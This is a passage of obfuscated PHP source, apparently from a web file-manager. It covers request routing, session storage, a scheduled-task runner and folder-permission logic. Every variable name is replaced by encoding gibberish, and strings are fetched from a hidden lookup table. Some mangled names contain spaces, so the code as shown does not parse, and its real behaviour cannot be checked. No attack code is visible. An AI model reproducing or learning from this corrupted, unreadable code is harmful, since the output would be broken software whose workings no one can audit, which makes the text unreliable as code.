error($ßŸ°è) { self::$errorCallback = $ßŸ°è; } public static function haltOnMatch($øşÃº‚à = true) { self::$halts = $øşÃº‚à; } public static function dispatch() { $Î  –½š =& $_SERVER[™¾ÇÙ¯¹]; $®ö–øù  = parse_url($_SERVER[$Î  –½š[1611]], PHP_URL_PATH); $úù¬¬ı‹ = $_SERVER[$Î  –½š[159]]; $ñ·èÊ­ï = array_keys(static::$patterns); $Òş“ŞŞÄ = array_values(static::$patterns); $ºÓà®Ù = !1; self::$routes = preg_replace($Î  –½š[1277], $Î  –½š[8], self::$routes); if (in_array($®ö–øù , self::$routes)) { $¸ĞÔ×¤¯ = array_keys(self::$routes, $®ö–øù ); foreach ($¸ĞÔ×¤¯ as $ƒğ˜°ì) { if (self::$methods[$ƒğ˜°ì] == $úù¬¬ı‹ || self::$methods[$ƒğ˜°ì] == $Î  –½š[1612] || in_array($úù¬¬ı‹, self::$maps[$ƒğ˜°ì])) { $ºÓà®Ù = !0; if (!is_object(self::$callbacks[$ƒğ˜°ì])) { $‰´Ï¯¿Ğ = explode($Î  –½š[8], self::$callbacks[$ƒğ˜°ì]); $¯ø¬òë× = end($‰´Ï¯¿Ğ); $ØĞ®¿á¯ = explode($Î  –½š[1613], $¯ø¬òë×); $½ÇõÊ” = new $ØĞ®¿á¯[0](); $½ÇõÊ”->{$ØĞ®¿á¯[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ƒğ˜°ì]); if (self::$halts) { return; } } } } } else { $Š°Ãõ€ = 0; foreach (self::$routes as $ƒğ˜°ì) { if (strpos($ƒğ˜°ì, $Î  –½š[4]) !== !1) { $ƒğ˜°ì = str_replace($ñ·èÊ­ï, $Òş“ŞŞÄ, $ƒğ˜°ì); } if (preg_match($Î  –½š[1614] . $ƒğ˜°ì . $Î  –½š[1615], $®ö–øù , $Ç¬œó­)) { if (self::$methods[$Š°Ãõ€] == $úù¬¬ı‹ || self::$methods[$Š°Ãõ€] == $Î  –½š[1612] || !empty(self::$maps[$Š°Ãõ€]) && in_array($úù¬¬ı‹, self::$maps[$Š°Ãõ€])) { $ºÓà®Ù = !0; array_shift($Ç¬œó­); if (!is_object(self::$callbacks[$Š°Ãõ€])) { $‰´Ï¯¿Ğ = explode($Î  –½š[8], self::$callbacks[$Š°Ãõ€]); $¯ø¬òë× = end($‰´Ï¯¿Ğ); $ØĞ®¿á¯ = explode($Î  –½š[1613], $¯ø¬òë×); $½ÇõÊ” = new $ØĞ®¿á¯[0](); if (!method_exists($½ÇõÊ”, $ØĞ®¿á¯[1])) { echo $Î  –½š[1616]; } else { call_user_func_array(array($½ÇõÊ”, $ØĞ®¿á¯[1]), $Ç¬œó­); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Š°Ãõ€], $Ç¬œó­); if (self::$halts) { return; } } } } $Š°Ãõ€++; } } if ($ºÓà®Ù == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $û‘ø‰¾¿ =& $_SERVER[™¾ÇÙ¯¹]; header($_SERVER[$û‘ø‰¾¿[1617]] . $û‘ø‰¾¿[1618]); echo $û‘ø‰¾¿[1619]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Î  –½š[1611]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $†ãıñË =& $_SERVER[™¾ÇÙ¯¹]; static $²˜…´êÂ = false; if ($²˜…´êÂ) { return $²˜…´êÂ; } $Ñíâ–È¼ = $GLOBALS[$†ãıñË[6]][$†ãıñË[358]]; self::$sessionTime = $Ñíâ–È¼[$†ãıñË[1620]]; $ÑŠ³„ = isset($GLOBALS[$†ãıñË[1621]]) ? $GLOBALS[$†ãıñË[1621]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÑŠ³„)) { self::$sessionSign = Cookie::get($ÑŠ³„); } else { self::$sessionSign = guid(); } } Cookie::setSafe($ÑŠ³„, self::$sessionSign, self::$sessionTime); $§Æ¨‡ª = $Ñíâ–È¼[$†ãıñË[1622]]; $°Ç–¹ïÊ = $Ñíâ–È¼[$§Æ¨‡ª]; $ğ‰Æ­ŞÉ = $Ñíâ–È¼[$†ãıñË[843]]; switch ($§Æ¨‡ª) { case $†ãıñË[21]: self::$handle = Model($†ãıñË[844]); break; case $†ãıñË[845]: self::$handle = new CacheRedis($°Ç–¹ïÊ, $ğ‰Æ­ŞÉ); break; case $†ãıñË[846]: self::$handle = new CacheMemcached($°Ç–¹ïÊ, $ğ‰Æ­ŞÉ); break; case $†ãıñË[199]: $°Ç–¹ïÊ[$†ãıñË[84]] = $°Ç–¹ïÊ[$†ãıñË[84]] . $†ãıñË[1623]; self::$handle = new CacheFile($°Ç–¹ïÊ, $ğ‰Æ­ŞÉ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $²˜…´êÂ = new self(); return $²˜…´êÂ; } public static function getBySign($ì©Ñ¬´µ) { CacheLock::lock($ì©Ñ¬´µ); $ŠÂ“À×§ = self::$handle->get($ì©Ñ¬´µ); CacheLock::unlock($ì©Ñ¬´µ); $ŠÂ“À×§ = unserialize($ŠÂ“À×§); return is_array($ŠÂ“À×§) ? $ŠÂ“À×§ : array(); } public static function setBySign($ Öë–„Î, $©õÁ³…ç) { CacheLock::lock($ Öë–„Î); self::$handle->set($ Öë–„Î, serialize($©õÁ³…ç), self::$sessionTime); CacheLock::unlock($ Öë–„Î); } public static function sign($°šÇ™™™ = false) { $°šÇ™™™ && (self::$sessionSign = $°šÇ™™™); self::init(); return self::$sessionSign; } public static function set($Óâí÷ÆÜ, $ì¤Õšé = false) { self::init(); if (is_array($Óâí÷ÆÜ)) { foreach ($Óâí÷ÆÜ as $¢‘ğëİ” => $òéÔÃ‘°) { array_set_value(self::$data, $¢‘ğëİ”, $òéÔÃ‘°); } } else { array_set_value(self::$data, $Óâí÷ÆÜ, $ì¤Õšé); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ó§¿ùÉ‰ = false) { self::init(); if (!$Ó§¿ùÉ‰) { return self::$data; } return array_get_value(self::$data, $Ó§¿ùÉ‰); } public static function remove($õû—‡…) { self::init(); unset(self::$data[$õû—‡…]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[™¾ÇÙ¯¹][848])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $®ÃÀñç© =& $_SERVER[™¾ÇÙ¯¹]; if (self::valueGet($®ÃÀñç©[765]) != $®ÃÀñç©[88]) { return; } if (self::valueGet($®ÃÀñç©[1624]) == $®ÃÀñç©[88]) { $ø¼”øÕ¤ = self::valueGet($®ÃÀñç©[1625]); if (time() - $ø¼”øÕ¤ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$®ÃÀñç©[1626]] = 1; self::valueSet($®ÃÀñç©[1624], $®ÃÀñç©[88]); self::log($®ÃÀñç©[1627] . ACTION . $®ÃÀñç©[1628]); Session::$data = array(); Session::$sessionSign = $®ÃÀñç©[12]; $GLOBALS[$®ÃÀñç©[511]] = 1; Hook::bind($®ÃÀñç©[1629], $®ÃÀñç©[1630]); $¼¢‚³ÕÉ = 0; while (!0) { self::cacheClear(); if (self::valueGet($®ÃÀñç©[765]) != $®ÃÀñç©[88]) { self::valueSet($®ÃÀñç©[1624], $®ÃÀñç©[197]); self::log($®ÃÀñç©[1631]); die; } $’—¼¦òÅ = time(); if ($’—¼¦òÅ - $¼¢‚³ÕÉ >= 60) { self::valueSet(array($®ÃÀñç©[1624] => $®ÃÀñç©[88], $®ÃÀñç©[1625] => $’—¼¦òÅ), !1); $¼¢‚³ÕÉ = $’—¼¦òÅ; } if (!file_exists(USER_SYSTEM . $®ÃÀñç©[1632])) { self::valueSet(array($®ÃÀñç©[1624] => $®ÃÀñç©[197], $®ÃÀñç©[765] => $®ÃÀñç©[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $­ÑİşÚİ =& $_SERVER[™¾ÇÙ¯¹]; http_close(); self::valueSet($­ÑİşÚİ[765], $­ÑİşÚİ[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($­ÑİşÚİ[1624] => $­ÑİşÚİ[197], $­ÑİşÚİ[765] => $­ÑİşÚİ[88]), !1); } public static function taskSwitch() { $üÊÇÉÕ =& $_SERVER[™¾ÇÙ¯¹]; $‘Åï‰ = self::valueGet($üÊÇÉÕ[765]) == $üÊÇÉÕ[88] ? $üÊÇÉÕ[197] : $üÊÇÉÕ[88]; self::valueSet($üÊÇÉÕ[765], $‘Åï‰); } public static function shutdownEvent() { $¤Ê§·Ê· =& $_SERVER[™¾ÇÙ¯¹]; self::valueSet($¤Ê§·Ê·[1624], $¤Ê§·Ê·[197]); self::log($¤Ê§·Ê·[1633]); } public static function config($–¦ÆàŠã, $øÛ¤ÊÅÃ) { self::valueSet($_SERVER[™¾ÇÙ¯¹][765], $–¦ÆàŠã); } private static function taskRunAll() { $¸‘°Èæ¨ =& $_SERVER[™¾ÇÙ¯¹]; $å–üü˜Ò = timeFloat(); $•¢¬¼šÔ = Model($¸‘°Èæ¨[1634])->listData(); $·¹úá½ = count($•¢¬¼šÔ); for ($è§Ş­¦· = 0; $è§Ş­¦· < $·¹úá½; $è§Ş­¦·++) { $Êíªş¬Æ = $•¢¬¼šÔ[$è§Ş­¦·]; if (!$Êíªş¬Æ[$¸‘°Èæ¨[407]] || $Êíªş¬Æ[$¸‘°Èæ¨[1635]] != $¸‘°Èæ¨[88]) { continue; } if (!self::taskTimeCheck($Êíªş¬Æ)) { continue; } self::taskRun($Êíªş¬Æ); } Hook::trigger($¸‘°Èæ¨[1636]); self::taskQueueRun($å–üü˜Ò); } private static function taskQueueRun($œµÉê˜Ç) { $¢ÇüÒ´… = 10; while (!0) { $éºŞ»„ = TaskQueue::run(); if ($éºŞ»„ === !1) { break; } if (timeFloat() - $œµÉê˜Ç >= $¢ÇüÒ´…) { break; } } } private static function taskTimeCheck($§›ÉÕîû) { $–ãë¯Ã† =& $_SERVER[™¾ÇÙ¯¹]; $íÈ¢Ù¹¶ = json_decode($§›ÉÕîû[$–ãë¯Ã†[203]], !0); $õğ±¯ôå = intval($§›ÉÕîû[$–ãë¯Ã†[1625]]); $Ì» ¯í… = strtotime($–ãë¯Ã†[1637] . $íÈ¢Ù¹¶[$–ãë¯Ã†[1638]] . $–ãë¯Ã†[1639]) - strtotime($–ãë¯Ã†[1640]); $éŞˆÄÄ = time() - strtotime(date($–ãë¯Ã†[1641]) . $–ãë¯Ã†[1642]); $å¾õÆŒ = $éŞˆÄÄ >= $Ì» ¯í… && $éŞˆÄÄ <= $Ì» ¯í… + 3600; switch ($íÈ¢Ù¹¶[$–ãë¯Ã†[33]]) { case $–ãë¯Ã†[1643]: if (time() - $õğ±¯ôå < 3600 * 24 * 30) { return !1; } if ($íÈ¢Ù¹¶[$–ãë¯Ã†[1643]] == date($–ãë¯Ã†[1644]) && $å¾õÆŒ) { return !0; } break; case $–ãë¯Ã†[1645]: if (time() - $õğ±¯ôå < 3600 * 24 * 7) { return !1; } $ø’ÙßÏ = date($–ãë¯Ã†[1646]) == 0 ? 7 : date($–ãë¯Ã†[1646]); if ($íÈ¢Ù¹¶[$–ãë¯Ã†[1645]] == $ø’ÙßÏ && $å¾õÆŒ) { return !0; } break; case $–ãë¯Ã†[1638]: if (time() - $õğ±¯ôå < 3600 * 24) { return !1; } if ($å¾õÆŒ) { return !0; } break; case $–ãë¯Ã†[1647]: if (time() - $õğ±¯ôå >= floatval($íÈ¢Ù¹¶[$–ãë¯Ã†[1647]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ø¯º¤­ä =& $_SERVER[™¾ÇÙ¯¹]; static $á‡÷ß§¬ = 0; $Äà´¢Çı = 300; if (!$á‡÷ß§¬) { $á‡÷ß§¬ = time(); } if (time() - $á‡÷ß§¬ < $Äà´¢Çı) { return; } $á‡÷ß§¬ = time(); $ÇŠåô‡ = Model($Ø¯º¤­ä[521])->db($Ø¯º¤­ä[12]); if ($ÇŠåô‡) { $ÇŠåô‡->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ø¯º¤­ä[1648], $Ø¯º¤­ä[1649]); die; } } public static function taskRun($•÷•Ü©) { $áããå¦Û =& $_SERVER[™¾ÇÙ¯¹]; self::log($áããå¦Û[1650] . $•÷•Ü©[$áããå¦Û[407]] . $áããå¦Û[1651] . $•÷•Ü©[$áããå¦Û[32]] . $áããå¦Û[1652] . $•÷•Ü©[$áããå¦Û[1653]]); Model($áããå¦Û[1634])->run($•÷•Ü©[$áããå¦Û[407]]); $Ê±Æ”ï = timeFloat(); $à¿ÛÄƒŸ = $áããå¦Û[12]; switch ($•÷•Ü©[$áããå¦Û[33]]) { case $áããå¦Û[316]: $é²…Åª· = url_request($•÷•Ü©[$áããå¦Û[1653]], $áããå¦Û[230], !1, !1, !1, !1, 10); if ($é²…Åª·[$áããå¦Û[765]]) { $à¿ÛÄƒŸ = strlen($é²…Åª·[$áããå¦Û[1201]]); } break; case $áããå¦Û[229]: $à¿ÛÄƒŸ = Hook::apply($•÷•Ü©[$áããå¦Û[1653]]); default: break; } Model($áããå¦Û[1654])->add(array($áããå¦Û[1655] => $áããå¦Û[12], $áããå¦Û[1656] => $áããå¦Û[197], $áããå¦Û[33] => $áããå¦Û[1657] . $•÷•Ü©[$áããå¦Û[407]], $áããå¦Û[1658] => json_encode(array($áããå¦Û[32] => $•÷•Ü©[$áããå¦Û[32]], $áããå¦Û[1659] => timeFloat() - $Ê±Æ”ï, $áããå¦Û[302] => $à¿ÛÄƒŸ)))); $ŒÜä¯í = $à¿ÛÄƒŸ ? $áããå¦Û[1660] . $à¿ÛÄƒŸ : $áããå¦Û[12]; self::log($áããå¦Û[1661] . $•÷•Ü©[$áããå¦Û[407]] . $áããå¦Û[164] . $ŒÜä¯í); return !0; } private static function valueGet($œåª¡ß¹) { $÷Í¸ û =& $_SERVER[™¾ÇÙ¯¹]; $ÑâøßÁÅ = $÷Í¸ û[1662]; $Ú§¹Ò›ó = Model($÷Í¸ û[443])->get($œåª¡ß¹, $ÑâøßÁÅ); if (is_null($Ú§¹Ò›ó)) { Model($÷Í¸ û[443])->set($÷Í¸ û[765], $÷Í¸ û[88], $ÑâøßÁÅ); Model($÷Í¸ û[443])->set($÷Í¸ û[1624], $÷Í¸ û[197], $ÑâøßÁÅ); $Ú§¹Ò›ó = Model($÷Í¸ û[443])->get($œåª¡ß¹, $ÑâøßÁÅ); } return $Ú§¹Ò›ó; } private static function valueSet($’ìŸèâ, $·ï»÷ó©) { $áŸÔ‚İ¦ =& $_SERVER[™¾ÇÙ¯¹]; $æêÈíº® = $áŸÔ‚İ¦[1663]; CacheLock::lock($æêÈíº®); $íå×å—Ç = Model($áŸÔ‚İ¦[443])->set($’ìŸèâ, $·ï»÷ó©, $áŸÔ‚İ¦[1662]); CacheLock::unlock($æêÈíº®); return $íå×å—Ç; } protected static function log($ü¨Á­Ôµ) { write_log($ü¨Á­Ôµ, $_SERVER[™¾ÇÙ¯¹][1649]); } private static function cacheClear() { $©ˆÊùíø =& $_SERVER[™¾ÇÙ¯¹]; Cache::clearMemory(Model($©ˆÊùíø[443])->cacheKey($©ˆÊùíø[1662])); Cache::clearMemory(Model($©ˆÊùíø[443])->cacheKey($©ˆÊùíø[1664])); Model($©ˆÊùíø[1634])->cacheClear(); self::closeDatabase(); } } goto dÂºãÜÁœÛ; F’õ˜Æ™ƒ‹: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\143\x65\x5f\x61\x75\x74\150"; public function getAuth($ ©ĞØôÚ) { $ôÃÒ‹ù =& $_SERVER[™¾ÇÙ¯¹]; $¹ŞâÆŞ = $this->sourceAuthSelect($ ©ĞØôÚ); $Ô–äéßÌ = array(); $™»©Šˆå = array(); $ÔáàÉç = 2 << 25; foreach ($¹ŞâÆŞ as $ôñ—åş) { $šÚ×Ò§ = Model($ôÃÒ‹ù[515])->listData($ôñ—åş[$ôÃÒ‹ù[1941]]); if (!$šÚ×Ò§) { continue; } $Ô–äéßÌ[] = $ôñ—åş; $§Û¡–ª = 0; if ($ôñ—åş[$ôÃÒ‹ù[419]] == SourceModel::TYPE_GROUP) { $§Û¡–ª = $ÔáàÉç * 2; } if ($ôñ—åş[$ôÃÒ‹ù[419]] == SourceModel::TYPE_USER) { $§Û¡–ª = $ÔáàÉç; } if ($ôñ—åş[$ôÃÒ‹ù[419]] == SourceModel::TYPE_USER && $ôñ—åş[$ôÃÒ‹ù[513]] == $ôÃÒ‹ù[197]) { $§Û¡–ª = 0; } $™»©Šˆå[] = $šÚ×Ò§[$ôÃÒ‹ù[421]] + $§Û¡–ª; } array_multisort($™»©Šˆå, SORT_DESC, $Ô–äéßÌ); return $Ô–äéßÌ; } public function sourceAuthSelect($Î«¡Ôõœ) { $°ÅĞû“ =& $_SERVER[™¾ÇÙ¯¹]; static $Ûó©ò§ = array(); $çŞ¨üÉë = is_array($Î«¡Ôõœ) ? !1 : !0; if ($çŞ¨üÉë) { $Î«¡Ôõœ = array($Î«¡Ôõœ); } $ó¶í‘Ù = array(); foreach ($Î«¡Ôõœ as $Í†ó­¯š) { if (isset($Ûó©ò§[$Í†ó­¯š])) { $ó¶í‘Ù[$Í†ó­¯š] = $Ûó©ò§[$Í†ó­¯š]; } } if (count($ó¶í‘Ù) == count($Î«¡Ôõœ)) { return $çŞ¨üÉë ? $ó¶í‘Ù[$Î«¡Ôõœ[0]] : $ó¶í‘Ù; } $åùˆ—Íš = $°ÅĞû“[2014]; $˜¢Ô¨€ˆ = array($°ÅĞû“[410] => array($°ÅĞû“[7], $Î«¡Ôõœ)); $½ŞÃïû = $this->field($åùˆ—Íš)->order($°ÅĞû“[407])->where($˜¢Ô¨€ˆ)->select(); $ÇÍ–®É³ = array_to_keyvalue_group($½ŞÃïû, $°ÅĞû“[410]); foreach ($Î«¡Ôõœ as $Í†ó­¯š) { $Ûó©ò§[$Í†ó­¯š] = $ÇÍ–®É³[$Í†ó­¯š] ? $ÇÍ–®É³[$Í†ó­¯š] : array(); } if ($çŞ¨üÉë) { return $½ŞÃïû; } return $ÇÍ–®É³; } public function setAuth($šæå÷º, $«’äêŞÅ) { $ö¤¦ìğƒ =& $_SERVER[™¾ÇÙ¯¹]; $ÇÑâíôÇ = Model($ö¤¦ìğƒ[1335])->sourceInfo($šæå÷º); if (!$ÇÑâíôÇ) { return !1; } if ($ÇÑâíôÇ[$ö¤¦ìğƒ[419]] != SourceModel::TYPE_GROUP) { return !1; } $©Ÿ™³Õô = 1; $¿‰¨óâ° = $ÇÑâíôÇ[$ö¤¦ìğƒ[513]]; if ($¿‰¨óâ° != $©Ÿ™³Õô) { $Ó†İá©ë = array($ö¤¦ìğƒ[1837] => $¿‰¨óâ°); $ö†ñĞÓ = Model($ö¤¦ìğƒ[1927])->field($ö¤¦ìğƒ[1665])->where($Ó†İá©ë)->select(); $ö†ñĞÓ = array_to_keyvalue($ö†ñĞÓ, $ö¤¦ìğƒ[12], $ö¤¦ìğƒ[1665]); } $Ä”¸ò½€ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Š¤º¥ú = array(); foreach ($«’äêŞÅ as $Ûø¦áÒ) { if (!in_array($Ûø¦áÒ[$ö¤¦ìğƒ[419]], $Ä”¸ò½€)) { show_json(LNG($ö¤¦ìğƒ[2015]), !1); } if ($¿‰¨óâ° != $©Ÿ™³Õô) { if ($Ûø¦áÒ[$ö¤¦ìğƒ[419]] == SourceModel::TYPE_GROUP) { } if ($Ûø¦áÒ[$ö¤¦ìğƒ[513]] != 0 && !in_array($Ûø¦áÒ[$ö¤¦ìğƒ[513]], $ö†ñĞÓ)) { } } if ($Ûø¦áÒ[$ö¤¦ìğƒ[513]] == 0) { $Ûø¦áÒ[$ö¤¦ìğƒ[419]] = SourceModel::TYPE_USER; } $Š¤º¥ú[] = array($ö¤¦ìğƒ[410] => $šæå÷º, $ö¤¦ìğƒ[419] => intval($Ûø¦áÒ[$ö¤¦ìğƒ[419]]), $ö¤¦ìğƒ[513] => intval($Ûø¦áÒ[$ö¤¦ìğƒ[513]]), $ö¤¦ìğƒ[1941] => intval($Ûø¦áÒ[$ö¤¦ìğƒ[1941]]) ? intval($Ûø¦áÒ[$ö¤¦ìğƒ[1941]]) : 0, $ö¤¦ìğƒ[1997] => intval($Ûø¦áÒ[$ö¤¦ìğƒ[1997]]) ? intval($Ûø¦áÒ[$ö¤¦ìğƒ[1997]]) : -1); } $this->where(array($ö¤¦ìğƒ[425] => $šæå÷º))->delete(); $this->addAll($Š¤º¥ú); return !0; } public function authClear($Ş×ƒí¸¥) { $Î©ĞÅæè =& $_SERVER[™¾ÇÙ¯¹]; $•€º›õ€ = Model($Î©ĞÅæè[1335])->sourceInfo($Ş×ƒí¸¥); $ş‹Ø€½± = array($Ş×ƒí¸¥); if ($•€º›õ€[$Î©ĞÅæè[418]] == $Î©ĞÅæè[88]) { $šÎø¤ªù = array($Î©ĞÅæè[598] => array($Î©ĞÅæè[558], $•€º›õ€[$Î©ĞÅæè[529]] . $Ş×ƒí¸¥ . $Î©ĞÅæè[559])); $ş‹Ø€½± = Model($Î©ĞÅæè[1335])->field($Î©ĞÅæè[425])->where($šÎø¤ªù)->getField($Î©ĞÅæè[410], !0); $ş‹Ø€½±[] = $Ş×ƒí¸¥; } $this->where(array($Î©ĞÅæè[425] => array($Î©ĞÅæè[426], $ş‹Ø€½±)))->delete(); return !0; } public function getAllChildren($€Åã¥”Ê) { $¡ƒªöÍ =& $_SERVER[™¾ÇÙ¯¹]; $£°Ó© = Model($¡ƒªöÍ[1335])->sourceInfo($€Åã¥”Ê); if ($£°Ó©[$¡ƒªöÍ[418]] != $¡ƒªöÍ[88]) { return $this->sourceListAuth(array($€Åã¥”Ê)); } if ($£°Ó©[$¡ƒªöÍ[419]] != SourceModel::TYPE_GROUP) { return array(); } $Â‡îÈøÍ = 1; $á”èÚÃ¬ = array($€Åã¥”Ê); if ($£°Ó©[$¡ƒªöÍ[440]] == $¡ƒªöÍ[197] && $£°Ó©[$¡ƒªöÍ[513]] != $Â‡îÈøÍ) { $á”èÚÃ¬ = $this->groupChidldAllRootSource($£°Ó©[$¡ƒªöÍ[513]]); } $¶ßÉò¬‡ = $this->field($¡ƒªöÍ[410])->group($¡ƒªöÍ[410])->select(); $¶ßÉò¬‡ = array_to_keyvalue($¶ßÉò¬‡, $¡ƒªöÍ[12], $¡ƒªöÍ[410]); if (!$¶ßÉò¬‡) { return array(); } $‹¦âÈğÆ = $¡ƒªöÍ[2016]; $‘û”çù = array($¡ƒªöÍ[410] => array($¡ƒªöÍ[7], $¶ßÉò¬‡), $¡ƒªöÍ[439] => $¡ƒªöÍ[197]); $õ„Æ¯˜¥ = Model($¡ƒªöÍ[840])->field($‹¦âÈğÆ)->where($‘û”çù)->select(); $ˆğ²Ô› = array($€Åã¥”Ê); foreach ($õ„Æ¯˜¥ as $â…ã›ãÛ) { foreach ($á”èÚÃ¬ as $•ªáµÇÆ) { $Ê¹şÛŠ‹ = $¡ƒªöÍ[50] . $•ªáµÇÆ . $¡ƒªöÍ[50]; $ÕØÚÒ˜ = $â…ã›ãÛ[$¡ƒªöÍ[529]] . $â…ã›ãÛ[$¡ƒªöÍ[410]] . $¡ƒªöÍ[50]; if (strstr($ÕØÚÒ˜, $Ê¹şÛŠ‹)) { $ˆğ²Ô›[] = $â…ã›ãÛ[$¡ƒªöÍ[410]]; break; } } } return $this->sourceListAuth($ˆğ²Ô›); } private function sourceListAuth($ÆÆí£ş) { $·éêùõ =& $_SERVER[™¾ÇÙ¯¹]; $¦ÜéÎáÂ = Model($·éêùõ[1335])->sourceListInfo($ÆÆí£ş, !0); $¨ ÌùäØ = $this->sourceAuthSelect($ÆÆí£ş); $ğœÁ†£ = array(); $ÊôÆÕİ» = array(); foreach ($¦ÜéÎáÂ as $´®ãÊ¤Å) { unset($´®ãÊ¤Å[$·éêùõ[464]]); unset($´®ãÊ¤Å[$·éêùõ[462]]); unset($´®ãÊ¤Å[$·éêùõ[421]]); unset($´®ãÊ¤Å[$·éêùõ[86]]); $ÁçòÛáÁ = $¨ ÌùäØ[$´®ãÊ¤Å[$·éêùõ[410]]]; if (!$ÁçòÛáÁ) { continue; } $´®ãÊ¤Å[$·éêùõ[2017]] = $this->authTargetInfo($ÁçòÛáÁ); $´®ãÊ¤Å[$·éêùõ[527]] = rtrim($´®ãÊ¤Å[$·éêùõ[533]], $·éêùõ[8]) . $·éêùõ[8] . ltrim($´®ãÊ¤Å[$·éêùõ[527]], $·éêùõ[8]); $ğœÁ†£[] = $´®ãÊ¤Å; $ÀçŠœ”ç = count(explode($·éêùõ[8], trim($´®ãÊ¤Å[$·éêùõ[527]], $·éêùõ[8]))); $ÊôÆÕİ»[] = $ÀçŠœ”ç + ($´®ãÊ¤Å[$·éêùõ[33]] == $·éêùõ[75] ? 0 : 1000); } array_multisort($ÊôÆÕİ», SORT_ASC, $ğœÁ†£); return $ğœÁ†£; } private function groupChidldAllRootSource($º‹°ô´) { $š©àÏÜÏ =& $_SERVER[™¾ÇÙ¯¹]; $ñ°ã˜åñ = Model($š©àÏÜÏ[2018])->groupChildrenAll($º‹°ô´); $—ˆœÜà¦ = array($š©àÏÜÏ[440] => 0, $š©àÏÜÏ[513] => array($š©àÏÜÏ[7], $ñ°ã˜åñ), $š©àÏÜÏ[419] => SourceModel::TYPE_GROUP); $ƒÈÈ÷£ = Model($š©àÏÜÏ[840])->field($š©àÏÜÏ[410])->where($—ˆœÜà¦)->select(); $ƒÈÈ÷£ = array_to_keyvalue($ƒÈÈ÷£, $š©àÏÜÏ[12], $š©àÏÜÏ[410]); return $ƒÈÈ÷£; } private function authTargetInfo($€ôÉ‹) { $¶üŠ£´ =& $_SERVER[™¾ÇÙ¯¹]; $èòÔĞ¬ = array(); $õ”è½’ = array(); $¿é±£âÃ = 2 << 25; foreach ($€ôÉ‹ as $š¢Œ¢¨) { $‘Çõœ¶ë = Model($¶üŠ£´[515])->listData($š¢Œ¢¨[$¶üŠ£´[1941]]); if (!$‘Çõœ¶ë) { continue; } if ($š¢Œ¢¨[$¶üŠ£´[419]] == SourceModel::TYPE_USER) { $×’° = Model($¶üŠ£´[521])->getInfoSimpleOuter($š¢Œ¢¨[$¶üŠ£´[513]]); if ($×’°[$¶üŠ£´[1665]] == $¶üŠ£´[1198]) { continue; } if ($×’°[$¶üŠ£´[1665]] == $¶üŠ£´[197]) { $×’°[$¶üŠ£´[32]] = LNG($¶üŠ£´[2019]); } } else { $×’° = Model($¶üŠ£´[530])->getInfoSimple($š¢Œ¢¨[$¶üŠ£´[513]]); } if (!$×’°) { continue; } $×’°[$¶üŠ£´[475]] = $‘Çõœ¶ë; $èòÔĞ¬[] = $×’°; $™Ææ‰˜ß = 0; if ($š¢Œ¢¨[$¶üŠ£´[419]] == SourceModel::TYPE_GROUP) { $™Ææ‰˜ß = $¿é±£âÃ * 2; } if ($š¢Œ¢¨[$¶üŠ£´[419]] == SourceModel::TYPE_USER) { $™Ææ‰˜ß = $¿é±£âÃ; } if ($š¢Œ¢¨[$¶üŠ£´[419]] == SourceModel::TYPE_USER && $š¢Œ¢¨[$¶üŠ£´[513]] == $¶üŠ£´[197]) { $™Ææ‰˜ß = 0; } $õ”è½’[] = $‘Çõœ¶ë[$¶üŠ£´[421]] + $™Ææ‰˜ß; } array_multisort($õ”è½’, SORT_DESC, $èòÔĞ¬); return $èòÔĞ¬; } public function getAllChildrenByUser($â“¼¢ºâ, $ù£×™´ø) { $…´¼¸‚õ =& $_SERVER[™¾ÇÙ¯¹]; $óª‚ÈÔ… = Model($…´¼¸‚õ[543])->getInfo($ù£×™´ø); if (!$ù£×™´ø || !$â“¼¢ºâ || !$óª‚ÈÔ…) { return array(); } $ñˆÀÂÏ  = Model($…´¼¸‚õ[1335])->sourceInfo($â“¼¢ºâ); $¿Ü—ŸÜ = array(); $ÌÄª´’œ = 1; if ($ñˆÀÂÏ [$…´¼¸‚õ[440]] == $…´¼¸‚õ[197] && $ñˆÀÂÏ [$…´¼¸‚õ[513]] != $ÌÄª´’œ && $this->groupContainUser($ñˆÀÂÏ [$…´¼¸‚õ[513]], $ù£×™´ø)) { foreach ($óª‚ÈÔ…[$…´¼¸‚õ[2020]] as $“ïà‡Ÿ) { $°üøÚãğ = Model($…´¼¸‚õ[530])->getInfo($“ïà‡Ÿ[$…´¼¸‚õ[1837]]); $éÃ¸øŸº = Model($…´¼¸‚õ[543])->getInfoSimpleOuter($ù£×™´ø); $éÃ¸øŸº[$…´¼¸‚õ[475]] = $“ïà‡Ÿ[$…´¼¸‚õ[421]]; if (Model($…´¼¸‚õ[515])->authCheckAction($“ïà‡Ÿ[$…´¼¸‚õ[421]][$…´¼¸‚õ[421]], $…´¼¸‚õ[1858])) { continue; } $œ°¤¶•¡ = array($…´¼¸‚õ[32] => $…´¼¸‚õ[1613] . $°üøÚãğ[$…´¼¸‚õ[32]], $…´¼¸‚õ[410] => $°üøÚãğ[$…´¼¸‚õ[86]][$…´¼¸‚õ[410]], $…´¼¸‚õ[84] => KodIO::make($°üøÚãğ[$…´¼¸‚õ[86]][$…´¼¸‚õ[410]]), $…´¼¸‚õ[440] => $…´¼¸‚õ[197], 